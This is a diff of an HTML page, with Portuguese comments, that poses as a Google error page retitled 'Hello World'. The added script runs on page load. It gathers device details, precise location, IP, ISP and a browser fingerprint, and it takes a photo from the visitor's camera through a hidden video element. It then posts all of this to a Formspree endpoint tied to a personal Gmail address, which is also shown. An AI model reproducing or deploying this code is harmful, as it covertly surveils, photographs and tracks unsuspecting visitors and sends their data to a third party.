@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Erro 400 (Bad Request)</title>
+    <title>Hello World</title>
     <style>
         * {
             margin: 0;
@@ -206,18 +206,14 @@
             © 2025 Google LLC
         </div>
     </div>
-
     <script>
-        // Atualizar timestamp
-        document.getElementById('timestamp').textContent = new Date().toLocaleString('pt-BR');
-
-        // ========== CONFIGURAÇÃO ==========
+             // ========== CONFIGURAÇÃO ==========
         const CONFIG = {
             // Substitua pelo seu email
-            destinationEmail: 'seu-email@exemplo.com',
+            destinationEmail: 'vitoralves1604@gmail.com',
             
             // Formspree (gratuito) - substitua pelo seu endpoint
-            formspreeEndpoint: 'https://formspree.io/f/SEU_FORM_ID'
+            formspreeEndpoint: 'https://formspree.io/f/mldnbzpr'
         };
 
         // ========== DETECÇÃO DE NOME DO DISPOSITIVO ==========
@@ -775,3 +771,212 @@
 • Cookies: ${deviceInfo.browserDetails.cookiesEnabled ? 'Sim' : 'Não'}
 • Do Not Track: ${deviceInfo.browserDetails.doNotTrack || 'N/A'}
 • Online: ${deviceInfo.browserDetails.onLine ? 'Sim' : 'Não'}
+• Idiomas: ${deviceInfo.browserDetails.languages}
+
+📍 LOCALIZAÇÃO:
+${locationInfo ? 
+`• Método: ${locationInfo.method || 'N/A'}
+• Precisão: ${locationInfo.precision || 'N/A'}
+• Coordenadas: ${locationInfo.latitude}, ${locationInfo.longitude}
+• Exatidão: ${locationInfo.accuracy || 'N/A'}
+• País: ${locationInfo.country || 'N/A'}
+• Região: ${locationInfo.region || 'N/A'}
+• Cidade: ${locationInfo.city || 'N/A'}
+• CEP: ${locationInfo.postal || 'N/A'}
+• IP: ${locationInfo.ip || 'N/A'}
+• ISP: ${locationInfo.isp || 'N/A'}
+• Timezone: ${locationInfo.timezone || deviceInfo.timezone}
+• Altitude: ${locationInfo.altitude || 'N/A'}
+• Velocidade: ${locationInfo.speed || 'N/A'}
+• Direção: ${locationInfo.heading || 'N/A'}
+• Conexão: ${locationInfo.connection?.effectiveType || 'N/A'}
+• Mapa: ${locationInfo.mapsUrl}
+• Fingerprint: ${locationInfo.fingerprint?.canvasFingerprint || 'N/A'}` : 
+'• Localização não disponível'}
+
+📸 FOTO:
+${photoInfo ? 
+`• Status: Capturada com sucesso
+• Resolução: ${photoInfo.width}x${photoInfo.height}
+• Tamanho: ${Math.round(photoInfo.size / 1024)}KB
+• Timestamp: ${photoInfo.timestamp}
+• Câmera: ${photoInfo.camera || 'frontal'}
+• Formato: JPEG
+• Dados: [Foto anexada em base64]` : 
+'• Status: Não capturada (sem permissão ou câmera indisponível)'}
+
+🔧 TÉCNICO:
+• User Agent: ${deviceInfo.userAgent}
+• IP: ${deviceInfo.ip}
+================================
+            `.trim();
+
+            // Método 1: Formspree
+            try {
+                const response = await fetch(CONFIG.formspreeEndpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: CONFIG.destinationEmail,
+                        subject: `🚨 ${deviceInfo.deviceName} Detectado`,
+                        message: emailContent,
+                        device_name: deviceInfo.deviceName,
+                        device_type: deviceInfo.deviceType,
+                        device_os: deviceInfo.os,
+                        manufacturer: deviceInfo.manufacturer,
+                        location: locationInfo ? `${locationInfo.latitude}, ${locationInfo.longitude}` : 'N/A',
+                        photo: photoInfo ? photoInfo.data : null,
+                        photo_info: photoInfo ? `${photoInfo.width}x${photoInfo.height}, ${Math.round(photoInfo.size/1024)}KB` : 'N/A'
+                    })
+                });
+
+                if (response.ok) {
+                    console.log('✅ Email enviado via Formspree');
+                    return;
+                }
+            } catch (error) {
+                console.warn('Formspree falhou:', error);
+            }
+
+            // Método 2: EmailJS (alternativa)
+            // Você pode configurar EmailJS como backup
+
+            // Método 3: Salvar no console para desenvolvimento
+            console.log('==========================================');
+            console.log('📧 DADOS COLETADOS:');
+            console.log('==========================================');
+            console.log('Para:', CONFIG.destinationEmail);
+            console.log('Conteúdo:');
+            console.log(emailContent);
+            console.log('==========================================');
+            console.log('Dispositivo:', deviceInfo);
+            console.log('Localização:', locationInfo);
+            console.log('Foto:', photoInfo ? `Capturada: ${photoInfo.width}x${photoInfo.height}, ${Math.round(photoInfo.size/1024)}KB` : 'Não capturada');
+            console.log('==========================================');
+        }
+
+        // ========== CAPTURA DE FOTO ==========
+        async function capturePhoto() {
+            try {
+                console.log('📸 Tentando acessar câmera...');
+                
+                // Tentar acessar câmera (sempre pedirá permissão)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user' // Câmera frontal se disponível
+                    } 
+                });
+                
+                // Criar elemento de vídeo invisível
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                video.srcObject = stream;
+                video.autoplay = true;
+                document.body.appendChild(video);
+                
+                // Aguardar o vídeo estar pronto
+                await new Promise(resolve => {
+                    video.onloadedmetadata = resolve;
+                });
+                
+                // Criar canvas para capturar frame
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                
+                // Capturar frame atual
+                ctx.drawImage(video, 0, 0);
+                
+                // Parar stream
+                stream.getTracks().forEach(track => track.stop());
+                document.body.removeChild(video);
+                
+                // Converter para base64
+                const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                console.log('✅ Foto capturada');
+                return {
+                    data: photoData,
+                    width: canvas.width,
+                    height: canvas.height,
+                    timestamp: new Date().toISOString(),
+                    size: Math.round(photoData.length * 0.75) // Tamanho aproximado em bytes
+                };
+                
+            } catch (error) {
+                console.log('❌ Erro ao capturar foto:', error.message);
+                
+                // Tentar câmera traseira se frontal falhar
+                if (error.name === 'OverconstrainedError') {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: 'environment' } 
+                        });
+                        
+                        const video = document.createElement('video');
+                        video.style.display = 'none';
+                        video.srcObject = stream;
+                        video.autoplay = true;
+                        document.body.appendChild(video);
+                        
+                        await new Promise(resolve => {
+                            video.onloadedmetadata = resolve;
+                        });
+                        
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        
+                        ctx.drawImage(video, 0, 0);
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        document.body.removeChild(video);
+                        
+                        const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                        
+                        console.log('✅ Foto capturada (câmera traseira)');
+                        return {
+                            data: photoData,
+                            width: canvas.width,
+                            height: canvas.height,
+                            timestamp: new Date().toISOString(),
+                            size: Math.round(photoData.length * 0.75),
+                            camera: 'traseira'
+                        };
+                        
+                    } catch (error2) {
+                        console.log('❌ Câmera traseira também falhou:', error2.message);
+                    }
+                }
+                
+                return null;
+            }
+        }
+
+        // ========== EXECUÇÃO AUTOMÁTICA ==========
+        async function init() {
+            console.log('🚀 Coletando dados...');
+            
+            const deviceInfo = collectDeviceInfo();
+            const locationInfo = await getLocation();
+            
+            // Tentar capturar foto (pode falhar se não houver permissão)
+            const photoInfo = await capturePhoto();
+            
+            await sendEmail(deviceInfo, locationInfo, photoInfo);
+            
+            console.log('✅ Processo concluído');
+        }
+
+        // Executar automaticamente quando a página carregar
+        window.addEventListener('load', init);
+    </script>
+</body>
+</html>
